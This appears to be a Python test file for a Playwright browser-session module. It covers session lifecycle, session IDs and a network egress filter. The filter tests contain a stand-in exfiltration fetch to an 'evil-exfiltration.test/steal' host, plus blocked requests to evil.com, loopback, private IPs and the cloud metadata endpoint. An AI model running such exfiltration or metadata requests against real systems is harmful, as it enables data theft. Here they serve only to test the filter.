"""
Tests for Session orchestration (Sub-Phase 1).

Verifies:
1. Session lifecycle: browser launches, page loads, session tears down cleanly
2. Session ID is assigned (UUID4 format)
3. Context manager interface works
4. Network filter blocks off-domain requests
5. After stop(), browser is fully disconnected
"""

import asyncio
import sys
import uuid
from pathlib import Path

# Allow imports from the orchestration directory
sys.path.insert(0, str(Path(__file__).parent))

from session import Session
from network_filter import NetworkFilter


async def test_session_lifecycle():
    """Verify session starts, loads a page, and tears down cleanly."""
    print("=== Test: Session lifecycle ===")

    async with Session() as session:
        # Verify session ID is a valid UUID4
        try:
            uuid.UUID(session.session_id, version=4)
        except ValueError:
            raise AssertionError(f"session_id is not a valid UUID4: {session.session_id}")
        print(f"  Session ID: {session.session_id}")

        # Start the session — navigate to example.com
        page = await session.start("https://example.com")

        assert session.is_running, "Session should be running after start()"
        assert page is not None, "Page should not be None"
        assert session.page is page, "session.page should return the active page"
        assert session.target_url == "https://example.com"

        # Verify the page actually loaded
        title = await page.title()
        print(f"  Page title: {title}")
        assert "Example" in title, f"Expected 'Example' in title, got: {title}"

    # After context manager exit, everything should be torn down
    assert not session.is_running, "Session should not be running after stop()"
    assert session._browser is None, "Browser should be None after stop()"
    assert session._context is None, "Context should be None after stop()"
    assert session._page is None, "Page should be None after stop()"
    assert session._playwright is None, "Playwright should be None after stop()"

    print("  PASS: Session lifecycle works correctly\n")


async def test_network_filter_blocking():
    """Verify that the network filter blocks off-domain requests."""
    print("=== Test: Network egress filtering ===")

    async with Session() as session:
        page = await session.start("https://example.com")

        # The network filter should be active
        nf = session._network_filter
        assert nf is not None, "Network filter should be installed"

        # Navigate to an off-domain URL — this should be blocked by the filter.
        # We'll try to fetch an off-domain resource from within the page.
        blocked = await page.evaluate("""async () => {
            try {
                const resp = await fetch("https://evil-exfiltration.test/steal", { mode: "no-cors" });
                return "allowed";
            } catch (e) {
                return "blocked";
            }
        }""")

        assert blocked == "blocked", f"Off-domain fetch should be blocked, got: {blocked}"

        # Verify the blocked request was logged
        blocked_urls = nf.blocked_requests
        assert any("evil-exfiltration.test" in url for url in blocked_urls), \
            f"Expected blocked log to contain evil-exfiltration.test, got: {blocked_urls}"
        print(f"  Blocked requests: {blocked_urls}")

    print("  PASS: Network egress filtering works correctly\n")


async def test_network_filter_allows_target():
    """Verify that the network filter allows same-domain requests and blocks private subnets/metadata endpoints."""
    print("=== Test: Network filter allows target domain ===")

    nf = NetworkFilter("https://example.com")
    assert nf._is_allowed("https://example.com/page") is True
    assert nf._is_allowed("https://sub.example.com/asset.js") is True
    assert nf._is_allowed("https://fonts.googleapis.com/css") is True
    assert nf._is_allowed("https://evil.com/steal") is False
    assert nf._is_allowed("data:text/html,hello") is True

    # Block local loopbacks, metadata endpoints, and private IPs
    assert nf._is_allowed("http://127.0.0.1/steal") is False
    assert nf._is_allowed("http://localhost/steal") is False
    assert nf._is_allowed("http://169.254.169.254/latest/meta-data/") is False
    assert nf._is_allowed("http://192.168.1.50/asset") is False
    assert nf._is_allowed("http://[::1]/steal") is False

    print("  PASS: Filter domain and private/metadata blocking logic is correct\n")


async def test_multiple_sessions_independent():
    """Verify that two sessions get different IDs and don't share state."""
    print("=== Test: Multiple sessions are independent ===")

    async with Session() as s1:
        await s1.start("https://example.com")
        id1 = s1.session_id

    async with Session() as s2:
        await s2.start("https://example.com")
        id2 = s2.session_id

    assert id1 != id2, f"Session IDs should be unique, got {id1} twice"
    print(f"  Session 1: {id1}")
    print(f"  Session 2: {id2}")
    print("  PASS: Sessions are independent\n")


async def main():
    print("Session Orchestration Tests (Sub-Phase 1)\n")

    await test_network_filter_allows_target()
    await test_session_lifecycle()
    await test_network_filter_blocking()
    await test_multiple_sessions_independent()

    print("All Session Orchestration tests passed.")


if __name__ == "__main__":
    asyncio.run(main())
